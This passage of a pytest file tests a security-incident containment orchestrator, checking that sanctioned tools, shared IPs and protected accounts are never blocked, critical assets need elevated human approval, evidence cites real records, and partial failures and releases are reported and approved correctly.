    assert "terminate_process:TH-LT-2050/5120" in _considered_subjects(run)
    bad = [s for s in proposed if "TH-LT-2050" in s]
    assert bad == [], (f"isolation of a host whose only tunnel client is the sanctioned DNS tool (its termination "
                       f"is withheld as sanctioned): {bad}")


def test_dns_tunneling_approved_tool_with_vendor_rating_still_never_blocked_or_terminated():
    """A single vendor rates the approved tool's vendor domain MALICIOUS. The domain is
    approved_dns_tools.domains: it stays excluded (never executed), and the approved binary is never
    terminated."""
    data = copy.deepcopy(_raw("dns-tunneling", "edge-approved-dns-tool"))
    data["environment"]["reputations"].append(
        {"type": "domain", "value": "dnstools.example.net", "verdict": "MALICIOUS", "risk_score": 80,
         "confidence": 70, "integrations": ["virustotal"], "summary": "tunneling"})
    run = _detect(data, "dns-tunneling", "edge-approved-dns-tool", live=True)
    bad = [s for s in _proposed(run) if "dnstools.example.net" in s or s.startswith("terminate_process:TH-LT-2050")
           or s.startswith("terminate_process:TH-LT-2052")]
    assert bad == [], f"approved DNS tool blocked or terminated: {bad}"
    _approve_all(run)
    assert not [c for c in _state_calls(run) if "dnstools.example.net" in (c[2] or "")
                or (c[2] or "").startswith(("TH-LT-2050/", "TH-LT-2052/"))]


def test_dns_tunneling_forwarding_resolver_is_never_isolated():
    run = _detect(_raw("dns-tunneling", "edge-internal-resolver-only"), "dns-tunneling",
                  "edge-internal-resolver-only", live=True)
    isolations = [s for s in _proposed(run) if s.startswith(("isolate_endpoint:", "terminate_process:"))]
    assert isolations == [], f"forwarding resolver contained: {isolations}"
    _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] in ("isolate_endpoint", "terminate_process")]


# --------------------------------------------------------------------------- 4c. c2 specifics --
def test_c2_shared_infrastructure_ip_listed_by_the_source_is_never_blocked():
    data = copy.deepcopy(_raw("c2", "tp-approve-all"))
    data["incident"]["trigger"] = {**(data["incident"].get("trigger") or {}),
                                   "shared_infrastructure_ips": ["198.51.100.45"]}
    run = _detect(data, "c2", "tp-approve-all", live=True)
    assert "block_ip:198.51.100.45" not in _proposed(run)
    assert any(s == "block_ip:198.51.100.45" for s in _considered_subjects(run)), "shared IP not shown"
    _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] == "block_ip"]


def test_c2_ip_that_also_serves_a_clean_domain_is_never_blocked():
    """A DNS record shows 198.51.100.45 also answering for a domain rated CLEAN (shared hosting)."""
    data = copy.deepcopy(_raw("c2", "tp-approve-all"))
    data["environment"]["reputations"].append({"type": "domain", "value": "popular-site.test", "verdict": "CLEAN",
                                               "risk_score": 0, "confidence": 80, "integrations": ["umbrella"],
                                               "summary": "popular site"})
    data["environment"]["records"].append({
        "integration": "secure_endpoint", "atomic": "investigate_endpoint", "subject": _HOST,
        "record": {"kind": "dns_query", "endpoint": _HOST, "domain": "popular-site.test", "query_type": "A",
                   "response_ips": ["198.51.100.45"], "count": 3, "action": "allowed",
                   "first_seen": "2026-01-15T09:00:00Z", "last_seen": "2026-01-15T09:10:00Z"}})
    run = _detect(data, "c2", "tp-approve-all", live=False)
    assert "block_ip:198.51.100.45" not in _proposed(run)


@pytest.mark.parametrize("name", ["edge-unrated-beacon", "legacy-02-benign-saas-heartbeat"])
def test_c2_beacon_to_unrated_or_clean_destination_is_never_blocked(name: str):
    run = _detect(_raw("c2", name), "c2", name, live=True)
    blocks = [s for s in _proposed(run) if s.startswith(("block_", "isolate_", "terminate_"))]
    assert blocks == [], f"c2/{name}: periodicity alone produced {blocks}"


def test_c2_suspicious_destination_without_c2_category_is_never_blocked():
    """A domain rated only SUSPICIOUS (newly seen, DGA-looking) with no command-and-control category
    stays considered."""
    data = copy.deepcopy(_raw("c2", "tp-approve-all"))
    for rep in data["environment"]["reputations"]:
        if rep["type"] in ("domain", "url", "ip"):
            rep["verdict"] = "SUSPICIOUS"
            rep["summary"] = "newly seen"
    for record in _records(data):
        if record.get("kind") in ("dns_query", "network_connection"):
            record["categories"] = [] if record.get("kind") == "dns_query" else record.get("categories")
            record.pop("verdict", None)
            if record.get("kind") == "dns_query":
                record["categories"] = ["Newly Seen Domains"]
    run = _detect(data, "c2", "tp-approve-all", live=False)
    blocks = [s for s in _proposed(run) if s.startswith("block_")]
    assert blocks == [], f"SUSPICIOUS destinations without a C2 category blocked: {blocks}"


def test_c2_endpoint_without_malicious_activity_of_its_own_is_never_isolated():
    """The endpoint reached the rated destination, but no detection, malicious process or malicious
    hash: not isolated (the destination blocks cut the channel)."""
    data = copy.deepcopy(_raw("c2", "tp-approve-all"))
    data["environment"]["records"] = [e for e in data["environment"]["records"]
                                      if e["record"].get("kind") not in ("detection", "process_event")]
    for e in data["environment"]["records"]:
        if e["record"].get("kind") == "network_connection":
            e["record"].pop("sha256", None)
    data["environment"]["reputations"] = [r for r in data["environment"]["reputations"] if r["type"] != "sha256"]
    run = _detect(data, "c2", "tp-approve-all", live=False)
    bad = [s for s in _proposed(run) if s.startswith(("isolate_endpoint:", "terminate_process:"))]
    assert bad == [], f"endpoint contained on contact alone: {bad}"


# ---------------------------------------------------------------------- 4d. exfiltration specifics --
def test_exfiltration_internal_relay_address_is_never_blocked():
    baseline = _baseline("exfiltration")
    ip = [t for a, t, _k in baseline if a is ActionType.BLOCK_IP][0]
    data = _walk_replace(copy.deepcopy(_raw("exfiltration", "tp-approve-all")), ip, "10.40.1.15")
    run = _detect(data, "exfiltration", "tp-approve-all", live=True)
    assert not [s for s in _proposed(run) if s == "block_ip:10.40.1.15"]
    _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] == "block_ip" and c[2] == "10.40.1.15"]


@pytest.mark.parametrize("ip_rating", ["CLEAN", None], ids=["ip_clean", "ip_unrated"])
def test_exfiltration_destination_rated_clean_is_never_blocked(ip_rating: str | None):
    """Reputation rates the receiving service files-drop.test CLEAN (a sanctioned file service). The
    transfer record names that domain and its address 203.0.113.145. Exfiltration's contract: clean
    destinations are never proposed for a block. Blocking the address the clean-rated service was
    reached at cuts the same sanctioned service (and whatever else shares the address), so the IP of a
    transfer whose named domain is rated CLEAN must not be proposed either, also when no source rates
    the IP itself (reputation services rarely rate the addresses of SaaS front doors). The c2 workflow
    already treats an IP that serves a CLEAN-rated domain as shared infrastructure."""
    data = copy.deepcopy(_raw("exfiltration", "tp-approve-all"))
    data["environment"]["reputations"] = [
        {"type": "domain", "value": "files-drop.test", "verdict": "CLEAN", "risk_score": 0, "confidence": 80,
         "integrations": ["umbrella", "virustotal"], "summary": "sanctioned file service"}]
    if ip_rating:
        data["environment"]["reputations"].append(
            {"type": "ip", "value": "203.0.113.145", "verdict": ip_rating, "risk_score": 0, "confidence": 80,
             "integrations": ["umbrella"], "summary": "sanctioned file service"})
    for record in _records(data):
        if record.get("kind") in ("network_connection", "dns_query") and record.get("verdict") in (
                "MALICIOUS", "SUSPICIOUS"):
            record["verdict"] = "CLEAN"
    run = _detect(data, "exfiltration", "tp-approve-all", live=False)
    blocks = [s for s in _proposed(run) if s.startswith(("block_domain:", "block_ip:"))]
    assert blocks == [], f"CLEAN-rated destinations proposed for blocking: {blocks}"


def test_exfiltration_finished_transfer_never_isolates():
    run = _detect(_raw("exfiltration", "legacy-04-finished-transfer"), "exfiltration",
                  "legacy-04-finished-transfer", live=False)
    assert not [s for s in _proposed(run) if s.startswith("isolate_endpoint:")]


# ------------------------------------------------------------- 4e. identity workflows: protected accounts --
@pytest.mark.parametrize("workflow", ACCOUNT_WORKFLOWS)
def test_allowlisted_breakglass_account_is_never_disabled_or_revoked(workflow: str):
    baseline = _baseline(workflow)
    users = sorted({t for _a, t, k in baseline if k is TargetKind.USER})
    assert users
    data = _text_replace(copy.deepcopy(_raw(workflow, "tp-approve-all")), users[0], "breakglass@example.com")
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    bad = [s for s in _proposed(run) if s.endswith(":breakglass@example.com")
           or s.startswith("remove_privileged_role:breakglass@example.com")]
    assert bad == [], f"{workflow}: allow-listed break-glass account proposed: {bad}"
    shown = {e.target for e in package.excluded_targets} | {o.target for o in run.workflow_run.outcomes}
    assert "breakglass@example.com" in shown, "the excluded break-glass account is not shown to the analyst"
    if package.actions:
        _approve_all(run)
    assert not [c for c in _state_calls(run) if (c[2] or "").lower().startswith("breakglass@example.com")]


@pytest.mark.parametrize("workflow", ACCOUNT_WORKFLOWS)
@pytest.mark.parametrize("account", ["svc-backup@example.com", "ceo@example.com"])
def test_service_and_executive_accounts_are_elevated(workflow: str, account: str):
    baseline = _baseline(workflow)
    users = sorted({t for _a, t, k in baseline if k is TargetKind.USER})
    data = _text_replace(copy.deepcopy(_raw(workflow, "tp-approve-all")), users[0], account)
    run = _detect(data, workflow, "tp-approve-all", live=False)
    actions = [a for a in run.detection.package.actions if a.target_kind is TargetKind.USER and a.target == account]
    assert actions, f"{workflow}: precondition, an action on {account}"
    weak = [f"{a.action_type.value}:{a.target}" for a in actions
            if a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings]
    assert weak == [], f"{workflow}: {account} contained at STANDARD approval: {weak}"


@pytest.mark.parametrize("workflow", ACCOUNT_WORKFLOWS)
def test_account_the_identity_provider_marks_privileged_is_elevated(workflow: str):
    baseline = _baseline(workflow)
    user = sorted({t for _a, t, k in baseline if k is TargetKind.USER})[0]
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    marked = False
    for record in _records(data):
        if record.get("kind") == "user_profile" and record.get("user") == user:
            record["privileged"] = True
            record["roles"] = ["Helpdesk Administrator"]
            marked = True
    assert marked, f"{workflow}: precondition, a profile record for {user}"
    run = _detect(data, workflow, "tp-approve-all", live=False)
    actions = [a for a in run.detection.package.actions if a.target_kind is TargetKind.USER and a.target == user]
    assert actions
    weak = [f"{a.action_type.value}:{a.target}" for a in actions
            if a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings]
    assert weak == [], f"{workflow}: privileged account contained at STANDARD without a warning: {weak}"


def test_suspicious_authentication_corporate_egress_is_never_blocked_or_counted():
    run = _detect(_raw("suspicious-authentication", "edge-corporate-vpn-egress"), "suspicious-authentication",
                  "edge-corporate-vpn-egress", live=True)
    assert _proposed(run) == []
    assert _state_calls(run) == []


def test_suspicious_authentication_shared_attacker_ip_used_by_other_accounts_is_not_blocked():
    """Two other (not investigated) accounts sign in successfully from the attacker IP: it is a shared
    egress or shared infrastructure and is never proposed for a fleet-wide block."""
    data = copy.deepcopy(_raw("suspicious-authentication", "tp-approve-all"))
    for i, user in enumerate(("akim@example.com", "mlopez@example.com")):
        data["environment"]["records"].append({
            "integration": "microsoft_cloud", "atomic": "search_ip_enterprise", "subject": "203.0.113.145",
            "record": {"kind": "sign_in", "sign_in_id": f"si-shared-{i}", "user": user,
                       "timestamp": "2026-01-15T02:10:00Z", "ip": "203.0.113.145", "country": "NL",
                       "result": "success", "mfa_result": "satisfied", "risk_level": "none"}})
    run = _detect(data, "suspicious-authentication", "tp-approve-all", live=True)
    indexed = [r for r in run.workflow_run.index.records() if str(r.kind) == "sign_in"
               and getattr(r, "user", "") in ("akim@example.com", "mlopez@example.com")]
    assert indexed, "precondition: the other accounts' sign-ins are indexed"
    assert "block_ip:203.0.113.145" not in _proposed(run)
    _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] == "block_ip"]


@pytest.mark.parametrize("name", ["edge-tor-failed-attempts", "edge-credential-exposure-only"])
def test_suspicious_authentication_failed_attempts_or_exposure_alone_never_touch_the_account(name: str):
    run = _detect(_raw("suspicious-authentication", name), "suspicious-authentication", name, live=True)
    bad = [s for s in _proposed(run) if s.startswith(("revoke_sessions:", "disable_user:"))]
    assert bad == [], f"{name}: account actions without a successful suspicious sign-in: {bad}"


# ============================================================ 5. critical assets come out ELEVATED --
def _critical_override(baseline: Iterable[tuple[ActionType, str, TargetKind]]) -> dict[str, Any]:
    hosts = sorted({_host_part(t) for _a, t, k in baseline if k in _ENDPOINT_KINDS})
    users = sorted({t for _a, t, k in baseline if k is TargetKind.USER})
    users += sorted({t.split("/", 1)[0] for _a, t, k in baseline if k is TargetKind.ROLE_ASSIGNMENT}
                    if hasattr(TargetKind, "ROLE_ASSIGNMENT") else [])
    ips = sorted({f"{t}/32" for _a, t, k in baseline if k is TargetKind.IP})
    return {"critical_assets": {"classes": {
        "executive_endpoint": {"match": {"hostnames": hosts, "users": sorted(set(users))}},
        "production_server": {"match": {"ip_cidrs": ips or ["203.0.113.0/26"]}},
    }}}


_CRITICAL_KINDS = frozenset({TargetKind.ENDPOINT, TargetKind.USER, TargetKind.IP})


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_critical_asset_targets_are_elevated_with_a_warning_never_skipped(workflow: str):
    baseline = _baseline(workflow)
    critical = [t for t in baseline if t[2] in _CRITICAL_KINDS]
    assert critical, f"{workflow}: expected endpoint, user or IP targets in the baseline"
    data = _with_config(_raw(workflow, "tp-approve-all"), _critical_override(baseline))
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    assert package is not None
    by_key = {(a.action_type, a.target): a for a in package.actions}
    missing = [f"{a.value}:{t}" for a, t, _k in critical if (a, t) not in by_key]
    assert missing == [], f"{workflow}: critical targets silently skipped: {missing}"
    weak = [f"{a.value}:{t}" for a, t, _k in critical
            if by_key[(a, t)].approval_level is not ApprovalLevel.ELEVATED or not by_key[(a, t)].warnings]
    assert weak == [], f"{workflow}: critical targets without ELEVATED approval and warning: {weak}"
    with pytest.raises(ApprovalError):
        run.orchestrator.submit_decision(run._request(package, {"decision": "APPROVE_ALL"}, "APPROVE_ALL"),
                                         run.credentials("analyst"))
    assert _state_calls(run) == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_critical_asset_fixture_is_elevated_and_never_skipped(workflow: str):
    run = _detect(_raw(workflow, "critical-asset-elevated"), workflow, "critical-asset-elevated", live=False)
    package = run.detection.package
    assert package is not None and package.has_elevated
    elevated = [a for a in package.actions if a.approval_level is ApprovalLevel.ELEVATED]
    assert elevated and all(a.warnings for a in elevated), "ELEVATED action without a visible warning"


@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_host_actions_on_a_domain_controller_known_from_vendor_records_are_elevated(workflow: str):
    baseline = _baseline(workflow)
    hosts = {_host_part(t) for _a, t, k in baseline if k in _ENDPOINT_KINDS}
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    marked: set[str] = set()
    for record in _records(data):
        if record.get("kind") == "endpoint" and str(record.get("hostname", "")).upper() in hosts:
            record["groups"] = list(record.get("groups") or []) + ["Domain Controllers"]
            marked.add(str(record["hostname"]).upper())
    assert marked
    run = _detect(data, workflow, "tp-approve-all", live=False)
    package = run.detection.package
    weak = [f"{a.action_type.value}:{a.target}" for a in package.actions
            if a.target_kind in _ENDPOINT_KINDS and _host_part(a.target) in marked
            and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    missing = [f"{a.value}:{t}" for a, t, k in baseline if k in _ENDPOINT_KINDS and _host_part(t) in marked
               and not any((x.action_type, x.target) == (a, t) for x in package.actions)]
    assert missing == [], f"{workflow}: actions on the domain controller dropped: {missing}"
    assert weak == [], f"{workflow}: actions on a record-derived domain controller not ELEVATED: {weak}"


@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_endpoint_used_by_an_executive_is_elevated(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    marked = False
    for record in _records(data):
        if record.get("kind") == "endpoint" and str(record.get("hostname", "")).upper() == _HOST:
            record["users"] = list(record.get("users") or []) + [_EXECUTIVE]
            marked = True
    assert marked, f"{workflow}: precondition, an endpoint record for {_HOST}"
    run = _detect(data, workflow, "tp-approve-all", live=False)
    on_host = [a for a in run.detection.package.actions if _on_host(a, _HOST)]
    assert on_host
    weak = [f"{a.action_type.value}:{a.target}" for a in on_host
            if a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings]
    assert weak == [], f"{workflow}: the CEO's endpoint is contained at STANDARD approval: {weak}"


@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_critical_endpoint_reported_by_its_fqdn_is_elevated(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    _rename_host_in_records(data, _HOST, _HOST + ".corp.example.com")
    data = _with_config(data, {"critical_assets": {"classes": {
        "executive_endpoint": {"match": {"hostnames": [_HOST]}}}}})
    run = _detect(data, workflow, "tp-approve-all", live=False)
    package = run.detection.package
    on_host = [a for a in (package.actions if package else ()) if _on_host(a, _HOST)]
    assert on_host, f"{workflow}: precondition, an action on {_HOST}"
    weak = [f"{a.action_type.value}:{a.target}" for a in on_host
            if a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings]
    assert weak == [], f"{workflow}: critical host under its FQDN not ELEVATED: {weak}"


@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_critical_ip_on_a_second_interface_makes_host_actions_elevated(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    for record in _records(data):
        if record.get("kind") == "endpoint" and str(record.get("hostname", "")).upper() == _HOST:
            record["ip_addresses"] = ["10.40.1.15", "203.0.113.10"]
    run = _detect(data, workflow, "tp-approve-all", live=False)
    on_host = [a for a in run.detection.package.actions if _on_host(a, _HOST)]
    assert on_host, f"{workflow}: precondition, an action on {_HOST}"
    weak = [f"{a.action_type.value}:{a.target}" for a in on_host
            if a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings]
    assert weak == [], f"{workflow}: production address on the second interface ignored: {weak}"


@pytest.mark.parametrize("tag", ["Production", "PRODUCTION"])
@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_critical_tag_matching_ignores_case(workflow: str, tag: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    for record in _records(data):
        if record.get("kind") == "endpoint":
            record["tags"] = list(record.get("tags") or []) + [tag]
    run = _detect(data, workflow, "tp-approve-all", live=False)
    on_hosts = [a for a in run.detection.package.actions if a.target_kind in _ENDPOINT_KINDS]
    assert on_hosts
    assert all(a.approval_level is ApprovalLevel.ELEVATED and a.warnings for a in on_hosts)


@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_isolating_the_host_of_an_allowlisted_infrastructure_address_is_never_silent(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    marked = False
    for record in _records(data):
        if record.get("kind") == "endpoint" and str(record.get("hostname", "")).upper() == _HOST:
            record["ip_addresses"] = ["192.0.2.53"]
            marked = True
    assert marked
    run = _detect(data, workflow, "tp-approve-all", live=False)
    package = run.detection.package
    weak = [a.target for a in package.actions if a.action_type is ActionType.ISOLATE_ENDPOINT
            and _on_host(a, _HOST) and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    assert weak == [], f"{workflow}: the internal resolver's host isolated at STANDARD without a warning: {weak}"


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_release_of_elevated_controls_needs_the_elevated_approver(workflow: str):
    baseline = _baseline(workflow)
    data = _with_config(_raw(workflow, "tp-approve-all"), _critical_override(baseline))
    run = _detect(data, workflow, "tp-approve-all", live=True)
    _approve_all(run)
    release = run.propose_release()
    assert any(a.approval_level is ApprovalLevel.ELEVATED for a in release.actions)
    before = len(run.environment.state_changing_calls())
    with pytest.raises(ApprovalError):
        run.decide_release({"decision": "APPROVE_ALL"}, approvers=["analyst"])
    assert len(run.environment.state_changing_calls()) == before


def test_c2_blast_radius_many_hosts_is_elevated_never_dropped():
    run = _detect(_raw("c2", "legacy-04-blast-radius-many-hosts"), "c2", "legacy-04-blast-radius-many-hosts",
                  live=False)
    isolations = [a for a in run.detection.package.actions if a.action_type is ActionType.ISOLATE_ENDPOINT]
    assert isolations
    if len(isolations) > 5:
        weak = [a.target for a in isolations if a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings]
        assert weak == [], f"isolations beyond the endpoint cap at STANDARD approval: {weak}"


# ======================================================= 6. evidence references real, relevant records --
def _all_scenarios() -> list[Any]:
    out = []
    for workflow in P4_WORKFLOWS:
        for path in sorted((FIXTURES / workflow).glob("*.yaml")):
            out.append(pytest.param(workflow, path.stem, id=f"{workflow}/{path.stem}"))
    return out


def _mentions(record: Any, needles: Iterable[str]) -> bool:
    text = json.dumps(record.rule_item(), default=str).lower()
    return any(n and n.lower() in text for n in needles)


def _needles(action: Any) -> list[str]:
    target = action.target
    if action.target_kind in (TargetKind.FILE, TargetKind.PROCESS, TargetKind.PERSISTENCE_ITEM):
        host, _, rest = target.partition("/")
        return [host, rest] if rest else [host]
    if "/" in target and action.target_kind not in (TargetKind.URL,):
        return [p for p in target.split("/") if p]
    return [target]


@pytest.mark.parametrize("workflow, name", _all_scenarios())
def test_every_proposed_action_cites_a_record_about_its_target(workflow: str, name: str):
    run = _detect(_raw(workflow, name), workflow, name, live=False)
    package = run.detection.package
    wf = run.workflow_run
    assert wf is not None
    problems = []
    for action in package.actions if package else ():
        ids = [e.data.get("record_id") for e in action.evidence]
        unknown = [i for i in ids if i not in wf.index]
        if not ids or unknown:
            problems.append(f"{action.action_type.value}:{action.target}: unknown evidence {unknown or 'none'}")
            continue
        numbers = [getattr(e, "number", None) for e in action.evidence]
        if None in numbers or len(set(numbers)) != len(numbers):
            problems.append(f"{action.action_type.value}:{action.target}: evidence not uniquely numbered: {numbers}")
        if not any(_mentions(wf.index.get(i), _needles(action)) for i in ids):
            problems.append(f"{action.action_type.value}:{action.target}: no cited record mentions the target")
        if type(action.risk_score) is not int or type(action.confidence_score) is not int:
            problems.append(f"{action.action_type.value}:{action.target}: scores are not separate integers")
    assert problems == []


@pytest.mark.parametrize("workflow, name", _all_scenarios())
def test_hand_offs_and_manual_steps_cite_real_records(workflow: str, name: str):
    run = _detect(_raw(workflow, name), workflow, name, live=False)
    wf = run.workflow_run
    problems = []
    for item in wf.considered:
        unknown = [i for i in item.record_ids if i not in wf.index]
        if not item.record_ids or unknown:
            problems.append(f"considered {item.subject}: records {unknown or 'none'}")
    for handoff in getattr(wf, "handoffs", ()) or ():
        unknown = [i for i in handoff.record_ids if i not in wf.index]
        if not handoff.record_ids or unknown:
            problems.append(f"handoff {handoff.workflow_id}: records {unknown or 'none'}")
    assert problems == []


# ======================================================== 7. degraded sources never block the rest --
def _degradation_cases() -> list[Any]:
    out = []
    for workflow in P4_WORKFLOWS:
        suite = _scenario(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all").effective_suite()
        for integration in sorted(suite):
            out.append(pytest.param(workflow, integration, id=f"{workflow}:{integration}"))
    return out


@pytest.mark.parametrize("workflow, failed", _degradation_cases())
def test_a_failed_source_does_not_block_actions_backed_by_other_sources(workflow: str, failed: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=False)
    wf = run.workflow_run
    independent = []
    for action in run.detection.package.actions:
        sources = {wf.index.get(e.data["record_id"]).integration for e in action.evidence}
        if failed not in sources:
            independent.append((action.action_type, action.target))
    guard._reset_for_test_harness()
    if not independent:
        pytest.skip(f"every action of {workflow} cites {failed}")
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["faults"] = list(data["environment"].get("faults") or []) + [
        {"kind": "UNAVAILABLE", "integration": failed, "times": None}]
    degraded = _detect(data, workflow, "tp-approve-all", live=False)
    package = degraded.detection.package
    proposed = {(a.action_type, a.target) for a in package.actions} if package else set()
    lost = sorted(f"{a.value}:{t}" for a, t in independent if (a, t) not in proposed)
    assert lost == [], f"{workflow}: failing {failed} blocked actions backed by other sources: {lost}"


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_degraded_source_is_reported_not_hidden(workflow: str):
    base = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=False)
    answered = sorted({s.integration for r in base.workflow_run.results for s in r.sources
                       if s.outcome.value == "answered"})
    guard._reset_for_test_harness()
    assert answered
    failed = "virustotal" if "virustotal" in answered else answered[-1]
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["faults"] = list(data["environment"].get("faults") or []) + [
        {"kind": "UNAVAILABLE", "integration": failed, "times": None}]
    run = _detect(data, workflow, "tp-approve-all", live=False)
    summary = run.workflow_run.summary().model_dump_json()
    assert failed in summary, f"{workflow}: failed {failed} not reported"


# =============================================================== 8. partial failures are reported --
@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
@pytest.mark.parametrize("position", ["first", "last"])
@pytest.mark.parametrize("fault", ["FAIL", "NO_EFFECT", "TIMEOUT", "AUTH_FAIL", "INVALID_TARGET"])
def test_one_failed_or_ineffective_action_reports_partially_contained(workflow: str, position: str, fault: str):
    baseline = _baseline(workflow)
    action_type, target, _kind = baseline[0] if position == "first" else baseline[-1]
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["faults"] = list(data["environment"].get("faults") or []) + [
        {"kind": fault, "operation": action_type.value, "target": target, "times": None}]
    run = _detect(data, workflow, "tp-approve-all", live=True)
    decision = _approve_all(run)
    assert decision.report is not None
    assert decision.report.overall is ContainmentOverall.PARTIALLY_CONTAINED, (
        f"{workflow}: {fault} on {action_type.value} {target} reported {decision.report.overall}")


def _every_action_cases() -> list[Any]:
    out = []
    for workflow in P4_WORKFLOWS:
        run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=False)
        for action in run.detection.package.actions:
            out.append(pytest.param(workflow, action.action_type.value, action.target,
                                    id=f"{workflow}:{action.action_type.value}:{action.target[:24]}"))
        guard._reset_for_test_harness()
    return out


@pytest.mark.parametrize("workflow, operation, target", _every_action_cases())
def test_any_single_failed_action_reports_partially_contained(workflow: str, operation: str, target: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["faults"] = [{"kind": "FAIL", "operation": operation, "target": target, "times": None}]
    run = _detect(data, workflow, "tp-approve-all", live=True)
    decision = _approve_all(run)
    assert decision.report.overall is ContainmentOverall.PARTIALLY_CONTAINED


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_partial_failure_fixture_reports_partially_contained(workflow: str):
    run = _detect(_raw(workflow, "partial-failure"), workflow, "partial-failure", live=True)
    decision = _approve_all(run)
    assert decision.report.overall is ContainmentOverall.PARTIALLY_CONTAINED


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_every_action_failing_is_never_reported_contained(workflow: str):
    baseline = _baseline(workflow)
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["faults"] = [{"kind": "FAIL", "operation": a.value, "target": t, "times": None}
                                     for a, t, _k in baseline]
    run = _detect(data, workflow, "tp-approve-all", live=True)
    decision = _approve_all(run)
    assert decision.report.overall not in (ContainmentOverall.CONTAINED, ContainmentOverall.PARTIALLY_CONTAINED)
    assert run.runtime.registry.list(incident_id=run.incident_id) == []


# ============================================================= 9. release: approval and ownership --
_REVERSIBLE = frozenset(a for a in ActionType if get_action_spec(a).rollback_action_type is not None)


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_release_needs_release_approval_and_never_touches_preexisting_controls(workflow: str):
    baseline = _baseline(workflow)
    reversible = [(a, t) for a, t, _k in baseline if a in _REVERSIBLE]
    assert len(reversible) >= 2, f"{workflow}: need two reversible actions for this test"
    pre_action, pre_target = reversible[0]
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["preexisting"] = list(data["environment"].get("preexisting") or []) + [
        {"action_type": pre_action.value, "target": pre_target}]
    run = _detect(data, workflow, "tp-approve-all", live=True)
    _approve_all(run)
    controls = run.runtime.registry.list(incident_id=run.incident_id)
    assert controls, f"{workflow}: approved containment created no temporary control"
    assert all(c.incident_id == run.incident_id for c in controls)
    assert not [c for c in controls if (c.action_type, c.target) == (pre_action, pre_target)], (
        "a control was registered for a target that was already contained before this incident")
    assert all(c.action_type not in (ActionType.REVOKE_SESSIONS, ActionType.TERMINATE_PROCESS) for c in controls)

    calls_before = len(run.environment.state_changing_calls())
    release = run.propose_release()
    assert len(run.environment.state_changing_calls()) == calls_before, "proposing a release changed state"
    assert set(release.control_keys) <= {c.control_key for c in controls}
    for alias in ("ai", "automation"):
        with pytest.raises(ApprovalError):
            run.orchestrator.submit_release_decision(
                run._request(release, {"decision": "APPROVE_ALL"}, "APPROVE_ALL"), run.credentials(alias))
    assert len(run.environment.state_changing_calls()) == calls_before

    run.decide_release({"decision": "APPROVE_ALL"}, approvers=["analyst", "lead"])
    assert run.environment.in_desired_state(pre_action, pre_target), (
        f"{workflow}: release undid {pre_action.value} {pre_target}, which this incident did not create")
    restore_calls = run.environment.state_changing_calls()[calls_before:]
    released_targets = {(c.target or "").lower() for c in restore_calls}
    created_targets = {c.target.lower() for c in controls}
    assert released_targets <= created_targets, (
        f"{workflow}: release touched {sorted(released_targets - created_targets)} outside this incident's controls")


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_containment_approval_cannot_be_reused_as_release_approval(workflow: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    _approve_all(run)
    calls_before = len(run.environment.state_changing_calls())
    containment = run.detection.package
    with pytest.raises(Exception):  # noqa: B017
        run.orchestrator.submit_release_decision(
            run._request(containment, {"decision": "APPROVE_ALL"}, "APPROVE_ALL"),
            run.credentials("analyst", "lead"))
    assert len(run.environment.state_changing_calls()) == calls_before
    assert all(c.status.value == "ACTIVE" for c in run.runtime.registry.list(incident_id=run.incident_id))


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_release_performs_only_restorations_of_this_incidents_controls(workflow: str):
    run = _detect(_raw(workflow, "release-restoration"), workflow, "release-restoration", live=True)
    _approve_all(run)
    mine = run.runtime.registry.list(incident_id=run.incident_id)
    if not mine:
        pytest.skip("no control registered")
    release = run.propose_release()
